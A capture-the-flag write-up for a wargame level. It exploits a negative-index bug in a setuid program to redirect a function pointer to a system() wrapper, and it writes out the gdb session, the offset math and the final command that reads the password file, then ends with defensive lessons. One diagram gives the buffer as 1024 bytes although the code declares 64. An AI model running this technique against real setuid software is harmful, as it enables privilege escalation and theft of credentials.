## Level 3: validate user input and array boundaries

As before,
the password for the next level is in `/home/level03/.password`,
and a vulnerable setuid program with its source code is in `/levels/level03`.

Let's first play with the program to see what it does:
```
level02@box:~$ /levels/level03/level03
Usage: ./level03 INDEX STRING
Possible indices:
[0] to_upper    [1] to_lower
[2] capitalize  [3] length
level02@box:~$ /levels/level03/level03 0 hello
Uppercased string: HELLO
level02@box:~$ /levels/level03/level03 2 hello
Capitalized string: Hello
level02@box:~$ /levels/level03/level03 3 hello
Length of string 'hello': 5
```

It takes a string and runs some function on it depending on the index parameter.
Let's try to misuse this, for example with a negative index:
```
level02@box:~$ /levels/level03/level03 -1 x
Segmentation fault
```

Ouch. That can't be good.
Let's look at the relevant source code to see what happens to a negative index:
```
int main(int argc, char **argv) {
  int index;
  fn_ptr fns[NUM_FNS] = {&to_upper, &to_lower, &capitalize, &length};

  // Parse supplied index
  index = atoi(argv[1]);

  return truncate_and_call(fns, index, argv[2]);
}
```

The `main` method converts the index to an integer,
and calls `truncate_and_call` with 
an array of functions, the index, and the string argument.
Let's see this other function:
```
int truncate_and_call(fn_ptr *fns, int index, char *user_string) {
  char buf[64];
  // Truncate supplied string
  strncpy(buf, user_string, sizeof(buf) - 1);
  buf[sizeof(buf) - 1] = '\0';
  return fns[index](buf);
}
```

It truncates the string to 64 characters,
takes a function pointer from the `fns` array,
and calls it using the truncated buffer as parameter.

By applying pointer arithmetics,
a negative index will reference a memory location before the beginning of `fns`,
which happens to be on the stack.
The stack is a memory region to store local variables,
function parameters, return values, among others.
The details depend on the CPU architecture,
but roughly the following happens when `truncate_and_call` is called from `main`:

1. The function parameters are pushed on the stack in reverse order:
   the string, the index, the array of functions

2. The pointer to the next line of code in `main` is pushed on the stack

3. The function `truncate_and_call` is called

4. The local variable `buf` is pushed on the stack

When we reach the line of `fns[index](buf)`,
the content of the stack looks something like this:
```
0x0000      content of buf (1024 bytes)
0x0040+?    the return address
...
0x0040+X    content of fns (16 bytes) -->
0x0040+X        address of to_upper (4 bytes)
0x0040+X+4      address of to_lower
...
0x00??      content of index
0x00??      content of user_string
```

If index is 0-3,
the program will find the address of `to_upper`, `to_lower`, and so on, respectively,
and execute it.
Using a negative index,
the program will do the same with whatever it finds at the pointed location.

Now,
if the content of `buf` is stored before `fns`,
we can put there the address of another function,
and use an appropriate negative index to make the program execute it.
This unused `run` function looks perfect for our purposes:
```
int run(const char *str) {
  // This function is now deprecated.
  return system(str);
}
```

It takes a string and calls `system`,
which in turn will run it in the shell.
Since we can control the parameter,
we can make the program run whatever we want.

We can find the address of `run` using `objdump`:
```
level02@box:/levels/level03$ objdump -d level03 | grep run
0804879b <run>:
080487ae <truncate_and_call>:
 8048806:   74 05                   je     804880d <truncate_and_call+0x5f>
 80488f1:   e8 b8 fe ff ff          call   80487ae <truncate_and_call>
```

To find the right negative index,
we need to figure out the distance between `fns` and `buf` in the memory.
We can do that using `gdb`:
```
level02@box:/levels/level03$ gdb ./level03
(gdb) run -1 AAAAAAAA
Starting program: /levels/level03/level03 -1 AAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0xb77e1334 in ?? () from /lib/libc.so.6
```

That is,
we run the program with a negative index to make it crash,
and `AAAAAAAA` as the string to make it easy to spot when we look at the memory content.
When the program crashes,
`gdb` outputs the address of the code it could not execute,
in this example `0xb77e1334`.
Let's see the first couple of bytes of the stack:
```
(gdb) x/60xw $sp      
0xbfae3d5c: 0xbfae3dd8  0x00000001  0x00000000  0x00000000
0xbfae3d6c: 0x41414141  0x41414141  0x00000000  0x00000000
0xbfae3d7c: 0x00000000  0x00000000  0x00000000  0x00000000
0xbfae3d8c: 0x00000000  0x00000000  0x00000000  0x00000000
0xbfae3d9c: 0x00000000  0x00000000  0x00000000  0x00000000
0xbfae3dac: 0xaf5a90a9  0x00000000  0x0000000a  0xbfae3df8
0xbfae3dbc: 0x080488f6  0xbfae3dd8  0xffffffff  0xbfae4e4b
0xbfae3dcc: 0x08048921  0xb7705f52  0xb77e1334  0x08048624
0xbfae3ddc: 0x08048680  0x080486dc  0x08048759  0x0000044e
```

The string `AAAAAAAA` is easy to spot,
now we know that `buf` starts at `0xbfae3d6c`.
And since `fns[-1]` contains `0xb77e1334`,
now we also know that `fns[0]` is at `0xbfae3dd8`.
Before we can calculate the correct negative index,
consider that we need to use `buf` for more than one thing:

1. It should contain the address of the `run` method somewhere in it.

2. It should start with a suitable shell command to
   reveal the content of the password file.

If, for example,
we put the command `cat /home/level03/.password;` in the string,
followed by the address of the `run` method,
the memory will look something like this:
```
0xbfae3d6c:   c a t       / h o m     e / l e     v e l 0
0xbfae3d7c:   3 / . p     a s s w     o r d ;   0x0804879b
0xbfae3d8c: 0x00000000  0x00000000  0x00000000  0x00000000
0xbfae3d9c: 0x00000000  0x00000000  0x00000000  0x00000000
0xbfae3dac: 0xaf5a90a9  0x00000000  0x0000000a  0xbfae3df8
0xbfae3dbc: 0x080488f6  0xbfae3dd8  0xffffffff  0xbfae4e4b
0xbfae3dcc: 0x08048921  0xb7705f52  0xb77e1334  0x08048624
```
The difference between `fns` and the jump address is `0xbfae3dd8 - 0xbfae3d88 = 80`,
and since the size of an element in `fns` is 4 bytes,
the index we're looking for is `-80 / 4 = -20`:
```
level02@box:/levels/level03$ ./level03 -20 "cat /home/level03/.password;$(printf '\x9b\x87\x04\x08')"
eingaima
cat: can't open '��': No such file or directory
```

### Lessons to learn

- When validating user input,
  remember to consider nonsense input too,
  like negative indexes in this example,
  also known as *fuzz testing*.

- Always check array boundaries,
  make sure they are not breached at either end.

- Remove unused, deprecated code,
  especially if it's potentially dangerous.

